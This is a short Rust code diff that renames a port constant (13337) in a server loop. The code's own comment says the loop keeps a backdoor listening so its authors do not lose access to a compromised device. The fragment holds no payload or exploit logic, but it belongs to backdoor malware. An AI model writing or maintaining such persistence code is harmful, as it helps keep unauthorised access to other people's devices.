@@ -11,14 +11,14 @@ mod communication;
 pub mod os;
 
 const RETRY_INTERVAL_SECONDS: u64 = 60;
-const PORT: u16 = 13337;
+const SERVER_LISTENING_PORT: u16 = 13337;
 
 fn run_server_loop() {
     // Using loop here because in case we fail to create the server, we should try again.
     // This is because we don't want to lose access to a device we have a backdoor on.
     loop {
         // Blocking until server will die.
-        match communication::server::run_server(PORT) {
+        match communication::server::run_server(SERVER_LISTENING_PORT) {
             Ok(_) => (),
             Err(e) => {
                 println!(
